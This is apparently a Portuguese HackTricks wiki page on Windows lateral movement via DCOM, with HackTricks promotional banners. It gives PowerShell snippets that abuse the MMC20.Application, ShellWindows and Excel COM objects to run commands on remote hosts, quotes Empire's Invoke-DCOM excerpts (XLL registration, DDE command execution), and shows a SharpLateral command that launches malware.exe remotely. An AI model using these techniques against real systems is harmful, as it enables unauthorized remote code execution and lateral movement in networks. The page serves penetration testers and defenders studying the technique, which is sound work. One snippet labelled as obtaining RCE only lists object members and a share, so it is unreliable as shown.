# DCOM Exec

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

## MMC20.Application

**Para mais informações sobre esta técnica, confira o post original em [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Objetos do Modelo de Objeto Componente Distribuído (DCOM) apresentam uma capacidade interessante para interações baseadas em rede com objetos. A Microsoft fornece documentação abrangente tanto para DCOM quanto para Modelo de Objeto Componente (COM), acessível [aqui para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [aqui para COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Uma lista de aplicações DCOM pode ser recuperada usando o comando PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
O objeto COM, [Classe de Aplicação MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite a automação das operações de snap-in do MMC. Notavelmente, este objeto contém um método `ExecuteShellCommand` sob `Document.ActiveView`. Mais informações sobre este método podem ser encontradas [aqui](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Verifique sua execução:

Esse recurso facilita a execução de comandos através de uma rede por meio de uma aplicação DCOM. Para interagir com DCOM remotamente como um administrador, o PowerShell pode ser utilizado da seguinte forma:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Este comando conecta-se ao aplicativo DCOM e retorna uma instância do objeto COM. O método ExecuteShellCommand pode então ser invocado para executar um processo no host remoto. O processo envolve os seguintes passos:

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obter RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Para mais informações sobre esta técnica, consulte o post original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

O objeto **MMC20.Application** foi identificado como faltando "LaunchPermissions" explícitos, padrão para permissões que permitem acesso a Administradores. Para mais detalhes, um tópico pode ser explorado [aqui](https://twitter.com/tiraniddo/status/817532039771525120), e o uso do OleView .NET de [@tiraniddo](https://twitter.com/tiraniddo) para filtrar objetos sem Permissão de Lançamento explícita é recomendado.

Dois objetos específicos, `ShellBrowserWindow` e `ShellWindows`, foram destacados devido à falta de Permissões de Lançamento explícitas. A ausência de uma entrada de registro `LaunchPermission` sob `HKCR:\AppID\{guid}` significa que não há permissões explícitas.

###  ShellWindows
Para `ShellWindows`, que não possui um ProgID, os métodos .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitam a instanciação do objeto usando seu AppID. Este processo utiliza OleView .NET para recuperar o CLSID para `ShellWindows`. Uma vez instanciado, a interação é possível através do método `WindowsShell.Item`, levando à invocação de métodos como `Document.Application.ShellExecute`.

Exemplos de comandos PowerShell foram fornecidos para instanciar o objeto e executar comandos remotamente:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Movimento Lateral com Objetos DCOM do Excel

O movimento lateral pode ser alcançado explorando objetos DCOM do Excel. Para informações detalhadas, é aconselhável ler a discussão sobre como aproveitar o DDE do Excel para movimento lateral via DCOM no [blog da Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

O projeto Empire fornece um script PowerShell, que demonstra a utilização do Excel para execução remota de código (RCE) manipulando objetos DCOM. Abaixo estão trechos do script disponível no [repositório do GitHub do Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), mostrando diferentes métodos para abusar do Excel para RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Ferramentas de Automação para Movimento Lateral

Duas ferramentas são destacadas para automatizar essas técnicas:

- **Invoke-DCOM.ps1**: Um script PowerShell fornecido pelo projeto Empire que simplifica a invocação de diferentes métodos para executar código em máquinas remotas. Este script está acessível no repositório do Empire no GitHub.

- **SharpLateral**: Uma ferramenta projetada para executar código remotamente, que pode ser usada com o comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Ferramentas Automáticas

* O script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permite invocar facilmente todas as maneiras comentadas de executar código em outras máquinas.
* Você também pode usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referências

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
